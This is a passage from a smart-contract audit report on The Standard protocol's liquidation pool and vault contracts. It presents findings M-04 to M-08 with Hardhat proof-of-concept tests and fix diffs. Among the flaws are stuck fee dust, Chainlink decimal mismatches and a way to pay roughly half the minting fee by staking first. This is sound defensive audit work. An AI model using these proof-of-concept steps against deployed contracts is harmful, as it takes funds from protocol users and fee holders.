Do not immediately transfer the dust amount if `_feesForPool` is 0. Leave it there so that it can accumulate over time. Instead, add a separate access-controlled function `sweepDust()` which enables sweeping of any leftover dust EUROs to the `protocol`:

[LiquidationPoolManager.sol#L33](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L33)
```diff
    function distributeFees() public {
        IERC20 eurosToken = IERC20(EUROs);
        uint256 _feesForPool = eurosToken.balanceOf(address(this)) * poolFeePercentage / HUNDRED_PC;
        if (_feesForPool > 0) {
            eurosToken.approve(pool, _feesForPool);
            LiquidationPool(pool).distributeFees(_feesForPool);
+           eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
        }
-       eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
    }

+   // @audit : introduce a separate function with access control enabling recovery of any dust amount
+   function sweepDust() external onlyOwner {
+       IERC20 eurosToken = IERC20(EUROs);    
+       distributeFees();
+       eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
+   }
```

---

### <a id="m-04"></a>[M-04]
## **Fees denied to protocol/holders & funds are stuck for various combinations of holders and fees**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L182-L194
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L35-L40
<br>

## Summary
[LiquidationPool::distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L182-L194) uses `safeTransferFrom()` to pull fees to be distributed to holders (the `_amount` parameter of function `distributeFees()`). However, rounding-down of the calculations may result in leftover fee remaining in the `LiquidationPool` contract with no way to rescue them, causing them to be stuck forever:

[LiquidationPool::distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L182-L194)
```js
    function distributeFees(uint256 _amount) external onlyManager {
        uint256 tstTotal = getTstTotal();
        if (tstTotal > 0) {
            IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _amount);
            for (uint256 i = 0; i < holders.length; i++) {
                address _holder = holders[i];
                positions[_holder].EUROs += _amount * positions[_holder].TST / tstTotal;
            }
            for (uint256 i = 0; i < pendingStakes.length; i++) {
                pendingStakes[i].EUROs += _amount * pendingStakes[i].TST / tstTotal;
            }
        }
    }
```

## Example 1
Let us see an example where 
- the accumulated EUROs fee is $0.000000000000000198$ _(Equal to  198)_
- which means that with a 50% fee rate, $198 \div 2 = 99$ needs to be distributed (the `_amount`) among the holders
- we will also suppose that the number of holders is $100$ 
- with each holder having staked an equal quantity of TST equal to $50e18$.

Hence, $\text{tstTotal} = 50e18 * 100 = 5000e18$

For each holder, [L188](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L188) will calculate to:
$$
\begin{equation}
\begin{split}   positions[\_holder].EUROs &= (\_amount * positions[\_holder].TST) \div \text{tstTotal} \\
                &= (99 * 50e18) \div {5000e18} \\
                &= 4950e18 \div {5000e18} \\
                &= 0 \text{ (rounding down by solidity)}
\end{split}
\end{equation}
$$

Hence, all of the `_amount` ( $99$ ) now sits idle, undistributed within the contract with no way to rescue them.

<br>

## Example 2
Another example where 
- the accumulated fee is $40 \text{ EUROs}$ _(Equal to  40e18)_
- which means that with a 50% fee rate, $40e18 \div 2 = 20e18$ needs to be distributed (the `_amount`) among the holders
- we will also suppose that the number of holders is $3$ 
- with each holder having staked an equal quantity of TST equal to $50e18$.

Hence, $\text{tstTotal} = 50e18 * 3 = 150e18$

For each holder, [L188](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L188) will calculate to:
$$
\begin{equation}
\begin{split}   positions[\_holder].EUROs &= (\_amount * positions[\_holder].TST) \div \text{tstTotal} \\
                &= (20e18 \text{ EUROs} * 50e18) \div {150e18} \\
                &= 6666666666666666666 \text{ EUROs} \\
\end{split}
\end{equation}
$$

$\therefore \text{ leftover EUROs in the contract after fee distribution } = 20e18 - (3 * 6666666666666666666) = 2$ which now sits idle, undistributed within the contract with no way to rescue them.
<br><br>

**_Note_** that this issue may arise 
- by a Griefer calling [LiquidationPoolManager::distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L35-L40) directly, which has no access control OR 
- under the normal flow of operations with users calling [LiquidationPool::increasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L137) and [LiquidationPool::decreasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L151) functions which internally call `ILiquidationPoolManager(manager).distributeFees()` which would give rise to an identical issue.
```js
    function increasePosition(uint256 _tstVal, uint256 _eurosVal) external {
        require(_tstVal > 0 || _eurosVal > 0);
        consolidatePendingStakes();
@---->  ILiquidationPoolManager(manager).distributeFees();
        if (_tstVal > 0) IERC20(TST).safeTransferFrom(msg.sender, address(this), _tstVal);
        if (_eurosVal > 0) IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _eurosVal);
        pendingStakes.push(PendingStake(msg.sender, block.timestamp, _tstVal, _eurosVal));
        addUniqueHolder(msg.sender);
    }

    function decreasePosition(uint256 _tstVal, uint256 _eurosVal) external {
        consolidatePendingStakes();
@---->  ILiquidationPoolManager(manager).distributeFees();
        require(_tstVal <= positions[msg.sender].TST && _eurosVal <= positions[msg.sender].EUROs, "invalid-decr-amount");
        if (_tstVal > 0) {
            IERC20(TST).safeTransfer(msg.sender, _tstVal);
            positions[msg.sender].TST -= _tstVal;
        }
        if (_eurosVal > 0) {
            IERC20(EUROs).safeTransfer(msg.sender, _eurosVal);
            positions[msg.sender].EUROs -= _eurosVal;
        }
        if (empty(positions[msg.sender])) deletePosition(positions[msg.sender]);
    }

```

## PoC
We will recreate example-1 but with $10$ holders and accumulated fee as $18$. <br>
Apply the following patch inside file `test/liquidationPool.js` and run via `npx hardhat test --grep "results in stuck funds when holders are many & accumulated fee is low"` to see the test pass:

```diff
diff --git a/test/liquidationPool.js b/test/liquidationPool_2.js
index 8dd8580..05a74db 100644
--- a/test/liquidationPool.js
+++ b/test/liquidationPool_2.js
@@ -7,8 +7,9 @@ describe('LiquidationPool', async () => {
   let user1, user2, user3, Protocol, LiquidationPoolManager, LiquidationPool, MockSmartVaultManager,
   ERC20MockFactory, TST, EUROs;
 
+  let user4, user5, user6, user7, user8, user9, user10;
   beforeEach(async () => {
-    [ user1, user2, user3, Protocol ] = await ethers.getSigners();
+    [ user1, user2, user3, Protocol, user4, user5, user6, user7, user8, user9, user10 ] = await ethers.getSigners();
     ERC20MockFactory = await ethers.getContractFactory('ERC20Mock');
     TST = await ERC20MockFactory.deploy('The Standard Token', 'TST', 18);
     EUROs = await (await ethers.getContractFactory('EUROsMock')).deploy();
@@ -224,6 +225,94 @@ describe('LiquidationPool', async () => {
       expect(_position.EUROs).to.equal(distributedFees2);
     });
 
+    it('results in stuck funds when holders are many & accumulated fee is low', async () => {
+      expect(await EUROs.balanceOf(LiquidationPool.address)).to.equal(0);
+
+      const tstStake = ethers.utils.parseEther('10');
+      await TST.mint(user1.address, tstStake);
+      await TST.connect(user1).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user2.address, tstStake);
+      await TST.connect(user2).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user3.address, tstStake);
+      await TST.connect(user3).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user4.address, tstStake);
+      await TST.connect(user4).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user5.address, tstStake);
+      await TST.connect(user5).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user6.address, tstStake);
+      await TST.connect(user6).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user7.address, tstStake);
+      await TST.connect(user7).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user8.address, tstStake);
+      await TST.connect(user8).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user9.address, tstStake);
+      await TST.connect(user9).approve(LiquidationPool.address, tstStake);
+      await TST.mint(user10.address, tstStake);
+      await TST.connect(user10).approve(LiquidationPool.address, tstStake);
+      
+      await LiquidationPool.connect(user1).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user2).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user3).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user4).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user5).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user6).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user7).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user8).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user9).increasePosition(tstStake, 0);
+      await LiquidationPool.connect(user10).increasePosition(tstStake, 0);
+      
+      await fastForward(DAY);
+      // @audit-info : a `FEE-ACCUMULATING-ACTION` like mint() causes credit of fees into the LiquidationPoolManager contract
+      const fees = 18;
+      await EUROs.mint(LiquidationPoolManager.address, fees);
+      
+      // someone calls distributeFees()
+      await LiquidationPoolManager.distributeFees();
+      
+      let { _position } = await LiquidationPool.position(user1.address);
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user2.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user3.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user4.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user5.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user6.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user7.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user8.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user9.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+      
+      ({ _position } = await LiquidationPool.position(user10.address));
+      expect(_position.TST).to.equal(tstStake);
+      expect(_position.EUROs).to.equal(0); // @audit : no EUROs credited from the accrued fee
+
+      // @audit : all fees now stuck in the LiquidationPool contract
+      expect(await EUROs.balanceOf(LiquidationPool.address)).to.equal(fees/2);
+    });
+
     it('does not allow decreasing beyond position value, even with assets in pool', async () => {
       const tstStake1 = ethers.utils.parseEther('10000');
       await TST.mint(user1.address, tstStake1);
```

## Impact
- Loss of fee
- Funds get stuck

## Tools Used
Manual inspection, Hardhat.

## Recommendations
There are multiple ways to handle this. One approach would be to return any leftover fee in the `LiquidationPool.sol` contract back to the `LiquidationPoolManager.sol` contract which then gets claimed as protocol fee. <br>
Apply the following patch to `contracts/LiquidationPool.sol` which updates the `distributeFees()` function:

```diff
diff --git a/contracts/LiquidationPool.sol b/contracts/LiquidationPool2.sol
index 9b8e593..011d568 100644
--- a/contracts/LiquidationPool.sol
+++ b/contracts/LiquidationPool2.sol
@@ -183,12 +183,22 @@ contract LiquidationPool is ILiquidationPool {
         uint256 tstTotal = getTstTotal();
         if (tstTotal > 0) {
             IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _amount);
+            uint256 actuallyDistributed = 0;
+            uint256 feeToDistribute = 0;
             for (uint256 i = 0; i < holders.length; i++) {
                 address _holder = holders[i];
-                positions[_holder].EUROs += _amount * positions[_holder].TST / tstTotal;
+                feeToDistribute = _amount * positions[_holder].TST / tstTotal;
+                positions[_holder].EUROs += feeToDistribute;
+                actuallyDistributed += feeToDistribute;
             }
             for (uint256 i = 0; i < pendingStakes.length; i++) {
-                pendingStakes[i].EUROs += _amount * pendingStakes[i].TST / tstTotal;
+                feeToDistribute = _amount * pendingStakes[i].TST / tstTotal;
+                pendingStakes[i].EUROs += feeToDistribute;
+                actuallyDistributed += feeToDistribute;
+            }
+            uint256 leftover = _amount - actuallyDistributed;
+            if (leftover > 0) {
+                IERC20(EUROs).transfer(msg.sender, leftover);
             }
         }
     }
```

---

### <a id="m-05"></a>[M-05]
## **All Chainlink USD pair price feeds don't have 8 decimals**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220
<br>

## Summary
[distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220) calculates `costInEuros` by using:
```js
uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
```
where `assetPriceUsd` and `priceEurUsd` are raw values fetched through chainlink `latestRoundData()` function. This assumes that all price feeds will have the same decimal precision (apparently, 8 is the general supposition made by the protocol), but this is not the case. For example [AMPL / USD feed](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706#readContract) has 18 decimals. <br>
Any mismatch between the decimals of EUR/USD price feed and ASSET/USD price feed could cause incorrect calculation of -
- `costInEuros` on [L220](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220)
- `_portion` on [L223](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L223)
- `_position.EUROs` on [L226](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L226)
- `rewards[]` on [L227](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L227)
- `burnEuros` on [L228](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L228)

breaking major functionality across the protocol like -
- users getting lesser than expected rewards
- users getting their EUROs burned unfairly

[LiquidationPool.sol#L205-L241](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205-L241)
```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
@-------------->        uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
                        rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
@-------------->        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
                            IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
@--->   if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```

## Vulnerability Details
Let us consider an example:
- 1 EUR = 1.09621 USD. That is, Chainlink's `priceEurUsd` $= 109621000$ _(8 decimal precision for this [price feed](https://arbiscan.io/address/0xa14d53bc1f1c0f31b4aa3bd109344e5009051a84#readContract))_
- Let's assume an asset `TOX` with 18 decimal places
- 1 TOX = 1.09621 USD. That is, Chainlink's `assetPriceUsd` $= 1096210000000000000$ _(18 decimal precision for this price feed)_
- Let `_portion` be equal to $10$
- **_Incorrect_** calculation as per [L220](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220):
$$
\begin{equation}
\begin{split}   costInEuros &= 10 * {10}^{18-18} * 1096210000000000000 \div 109621000 * 100000 \div 120000 \\
                &= 10 * {10}^0 * 10000000000 * 100000 \div 120000 \\
                &= 83333333333 \\
\end{split}
\end{equation}
$$

- **_Correct_** expected calculation (modified for simplicity, see the _recommendation_ section below for exact changes to be made):
$$
\begin{equation}
\begin{split}   costInEuros &= 10 * {10}^{18-18} * 109621000 \div 109621000 * 100000 \div 120000 \\
                &= 10 * {10}^0 * 1 * 100000 \div 120000 \\
                &= 8 \\
\end{split}
\end{equation}
$$

- The incorrect value of `costInEuros` = `83333333333` will cause `_portion ` to be evaluated to a much lower value in [L223](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L223) since `83333333333` is in the denominator here. Therefore, the `rewards` calculated on [L227](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L227) is extremely low for the user. Also, `_position.EUROs` will be set to 0 on [L226](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L226).

## Impact
- users getting lesser than expected rewards
- users getting their EUROs burned unfairly
- incorrect calculations across protocol

## Tools Used
Manual inspection

## Recommendations
Consider calling `decimals()` function on the price feed contract to get the correct decimals and calculate the value based on the returned decimals:

```diff
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
+       uint256 DECIMAL_PRECISION_SAVER = 30;        
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
+       uint256 decimalsEurUsd = uint256(Chainlink.AggregatorV3Interface(eurUsd).decimals());        
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
+                       uint256 decimalsAssetUsd = uint256(Chainlink.AggregatorV3Interface(asset.token.clAddr).decimals());                                
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
-                       uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
-                           * _hundredPC / _collateralRate;
+                       uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * _hundredPC * uint256(assetPriceUsd) * (10 ** (DECIMAL_PRECISION_SAVER - decimalsAssetUsd)) / (uint256(priceEurUsd) * (10 ** (DECIMAL_PRECISION_SAVER - decimalsEurUsd)) * _collateralRate);
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
                        rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
                            IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
        if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```

---

### <a id="m-06"></a>[M-06]
## **Incorrect value returned by position() function**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L88
<br>

## Summary
The [position()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L88) function returns incorrect value for a user's EUROs holdings when balance of `LiquidationPoolManager.sol` contract is greater than zero. It forgets to apply the `_poolFeePercentage`.

## Vulnerability Details
The function is designed to let the caller know of their current EUROs position, including the yet-to-come fee still sitting in the `LiquidationPoolManager` contract. However, it incorrectly considers the full balance of `LiquidationPoolManager` instead of considering only 50% of it (the current `_poolFeePercentage` is 50%). This gives a wrong view to the caller.

```js
    function position(address _holder) external view returns(Position memory _position, Reward[] memory _rewards) {
        _position = positions[_holder];
        (uint256 _pendingTST, uint256 _pendingEUROs) = holderPendingStakes(_holder);
        _position.EUROs += _pendingEUROs;
        _position.TST += _pendingTST;
@---->  if (_position.TST > 0) _position.EUROs += IERC20(EUROs).balanceOf(manager) * _position.TST / getTstTotal();
        _rewards = findRewards(_holder);
    }
```

## PoC
Apply following patch to update `test/liquidationPoolManager.js` and run via `npx hardhat test --grep 'incorrect position function'`. The test will fail since it returns `201` instead of the correct value of `101`:

```diff
diff --git a/test/liquidationPoolManager.js b/test/liquidationPoolManager_position.js
index 7e0f5c2..03ef4f1 100644
--- a/test/liquidationPoolManager.js
+++ b/test/liquidationPoolManager_position.js
@@ -426,5 +426,26 @@ describe('LiquidationPoolManager', async () => {
       expect(rewardAmountForAsset(_rewards, 'WBTC')).to.equal(wbtcCollateral);
       expect(rewardAmountForAsset(_rewards, 'USDC')).to.equal(usdcCollateral);
     });
+    
+    it('incorrect position function', async () => {
+      const tstStake1 = 1;
+      const eurosStake1 = 1;
+      await TST.mint(holder1.address, tstStake1);
+      await EUROs.mint(holder1.address, eurosStake1);
+      await TST.connect(holder1).approve(LiquidationPool.address, tstStake1);
+      await EUROs.connect(holder1).approve(LiquidationPool.address, eurosStake1);
+      let { _rewards, _position } = await LiquidationPool.position(holder1.address);
+      expect(_position.EUROs).to.equal(0);
+      await LiquidationPool.connect(holder1).increasePosition(tstStake1, eurosStake1);
+      ({ _rewards, _position } = await LiquidationPool.position(holder1.address));
+      expect(_position.EUROs).to.equal(eurosStake1);
+      
+      // "mint some fee"
+      await EUROs.mint(LiquidationPoolManager.address, 200);
+      
+      ({ _rewards, _position } = await LiquidationPool.position(holder1.address));
+      // @audit : expected = existing_EUROs + 50% of fee = 1 + 50% of 200 = 101
+      expect(_position.EUROs).to.equal(101, "Incorrect position calculation");
+    });
   });
 });
```

## Impact
This is a `view` function which has so far been only used in the unit tests. However, its design seems to suggest it is supposed to help holders understand their expected holdings, including prospective fees coming their way. "Prospective" because this is still in the `LiquidationPoolManager.sol` contract and `distributeFees()` is yet to be called. As such, this misleads holders about their positions based on which they may be inclined to make further incorrect decisions about withdrawal, staking etc.

## Tools Used
Hardhat

## Recommendations
The `LiquidationPool.sol` contract needs to know the values of `_poolFeePercentage` and `HUNDRED_PC` to calculate this correctly. These can either be initialized in the constructor at deployment time, or need to be passed to the `position()` function:

```diff
-   function position(address _holder) external view returns(Position memory _position, Reward[] memory _rewards) {
+   function position(address _holder, uint256 _poolFeePercentage, uint256 _hundred_pc) external view returns(Position memory _position, Reward[] memory _rewards) {
        _position = positions[_holder];
        (uint256 _pendingTST, uint256 _pendingEUROs) = holderPendingStakes(_holder);
        _position.EUROs += _pendingEUROs;
        _position.TST += _pendingTST;
-       if (_position.TST > 0) _position.EUROs += IERC20(EUROs).balanceOf(manager) * _position.TST / getTstTotal();
+       if (_position.TST > 0) _position.EUROs += IERC20(EUROs).balanceOf(manager) * _position.TST * _poolFeePercentage / (_hundred_pc * getTstTotal());
        _rewards = findRewards(_holder);
    }
```

---

### <a id="m-07"></a>[M-07]
## **Vault can become undercollateralized without warning if token removed from accepted list**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L68-L69
<br>

## Summary
To check if a vault is undercollateralized or not, the protocol makes use of the [maxMintable()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L75) function which internally calls [euroCollateral()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L67). This particular function loops through the list of current `getTokenManager().getAcceptedTokens()` to find out the current collateral value in euro.

```js
    function euroCollateral() private view returns (uint256 euros) {
@--->   ITokenManager.Token[] memory acceptedTokens = getTokenManager().getAcceptedTokens();
        for (uint256 i = 0; i < acceptedTokens.length; i++) {
            ITokenManager.Token memory token = acceptedTokens[i];
            euros += calculator.tokenToEurAvg(token, getAssetBalance(token.symbol, token.addr));
        }
    }

    function maxMintable() private view returns (uint256) {
@--->   return euroCollateral() * ISmartVaultManagerV3(manager).HUNDRED_PC() / ISmartVaultManagerV3(manager).collateralRate();
    }
```

The problem arises in the following scenario:
- User deposits collateral using a token from the accepted list say, `sUSD`
- User mints some amount of EUROs
- TokenManager due to any reason, calls `removeAcceptedToken()` to remove `sUSD` from the list of accepted tokens
- Immediately, the Vault becomes undercollateralized and can be liqudated causing the user to lose all of his collateral.

There is no warning system or grace period which can give the user a chance to deposit a new token or swap the current one for another acceptable one. <br>
While removing a token may be okay for upcoming vaults to be created in future, for existing vaults it is certainly required to have a grace period of some sort.
<br><br>

This scenario also effects other functions like `claimRewards()`. All existing rewards associated with this token now vanish.

## PoC
Apply the following patch to update `test/smartVault.js` and run via `npx hardhat test --grep 'removing token causes undercollateralization'` to see the test fail. The vault becomes undercollateralized as soon as the token is removed from accepted list.

```diff
diff --git a/test/smartVault.js b/test/smartVault_2.js
index 464b603..2e8ce3a 100644
--- a/test/smartVault.js
+++ b/test/smartVault_2.js
@@ -324,13 +324,25 @@ describe('SmartVault', async () => {
 
   describe('swaps', async () => {
     let Stablecoin;
+    let StandardTokenSymbol;
 
     beforeEach(async () => {
       Stablecoin = await (await ethers.getContractFactory('ERC20Mock')).deploy('sUSD', 'sUSD', 6);
       const clUsdUsdPrice = 100000000;
       const ClUsdUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('sUSD / USD');
       await ClUsdUsd.setPrice(clUsdUsdPrice);
-      await TokenManager.addAcceptedToken(Stablecoin.address, ClUsdUsd.address);
+      let tx = await TokenManager.addAcceptedToken(Stablecoin.address, ClUsdUsd.address);
+      let receipt = await tx.wait();
+      StandardTokenSymbol = receipt.events[0].args.symbol;
+    });
+
+    it('removing token causes undercollateralization', async () => {
+      await Stablecoin.mint(Vault.address, ethers.utils.parseEther('1'));
+      expect(await Vault.connect(user).mint(user.address, ethers.utils.parseEther('.8'))).not.to.be.reverted;
+      expect(await Vault.undercollateralised()).to.eq(false, "before token removal");
+      
+      expect(await TokenManager.removeAcceptedToken(StandardTokenSymbol)).not.to.be.reverted;
+      expect(await Vault.undercollateralised()).to.eq(false, "after token removal"); // @audit : Vault becomes undercollateralized
     });
 
     it('only allows owner to perform swap', async () => {
```

## Impact
- Users lose funds with no warning system.
- All existing rewards associated with the removed token vanish.

## Tools Used
Hardhat

## Recommendations
The protocol needs to think about having a two-step token removal system. They can initially mark a token as backlisted and give a grace period of X days to existing vault holders before they are affected.

---

### <a id="m-08"></a>[M-08]
## **User can manage to pay less than expected fee for minting EUROs**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L182
<br>

## Summary
The protocol expects a user to pay 0.5% fee upon minting EUROs against their deposited collateral. 50% of this fee is distributed to the stakers and 50% taken by the protocol. A user can get away with reclaiming up to 50% of his paid fee by `staking + minting` instead of simply minting. Imagine the following scenario:
- Alice plans to mint €1000 worth of EUROs. She knows the fee involved is `0.5% of 1000 = €5`
- She first stakes 1 TST and 1 EUROs
- She then deposits €1206 worth of collateral since this is the minimum needed ---> `(1000 + 5) * 1.2 = €1206` 
- She mints €1000 EUROs. €2.5 of the fee goes to the protocol.
- €2.5 of the fee given back to any stakers present. Hence she receives €2.5 back.
- Alice can later withdraw her staked assets by calling `LiquidationPool::decreasePosition()` which involves no fee.

Even if there were additional stakers present in the pool since many days, their rightful share of the fee is diluted because Alice will always `stake + mint` instead of simply `mint`.

## PoC
Create a new file `test/payLessFee.js` with the following code and run via `npx hardhat test --grep 'lower fee payment on minting'` to see the test pass. The user just pays €2.5 fee instead of €5.

```js
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { ETH, getNFTMetadataContract, DEFAULT_EUR_USD_PRICE, DEFAULT_ETH_USD_PRICE, DEFAULT_COLLATERAL_RATE, HUNDRED_PC, fastForward, DAY, POOL_FEE_PERCENTAGE, fullyUpgradedSmartVaultManager, PROTOCOL_FEE_RATE } = require("./common");

describe('FeeInspection', async () => {
  let LiquidationPoolManager, LiquidationPool, TokenManager,
  TST, EUROs, ERC20MockFactory, admin, user1, protocol, liquidator, ClEurUsd, ClEthUsd, ClCoinUsd, VaultManager, Vault, collateralCoin;

  beforeEach(async () => {
    [admin, user1, protocol, liquidator] = await ethers.getSigners();

    ERC20MockFactory = await ethers.getContractFactory('ERC20Mock');
    TST = await ERC20MockFactory.deploy('The Standard Token', 'TST', 18);
    EUROs = await (await ethers.getContractFactory('EUROsMock')).deploy();
    ClEurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD'); 
    await ClEurUsd.setPrice(DEFAULT_EUR_USD_PRICE);
    ClEthUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ETH / USD'); 
    await ClEthUsd.setPrice(DEFAULT_ETH_USD_PRICE);

    TokenManager = await (await ethers.getContractFactory('TokenManagerMock')).deploy(ETH, ClEthUsd.address);
    const SmartVaultDeployer = await (await ethers.getContractFactory('SmartVaultDeployerV3')).deploy(ETH, ClEurUsd.address);
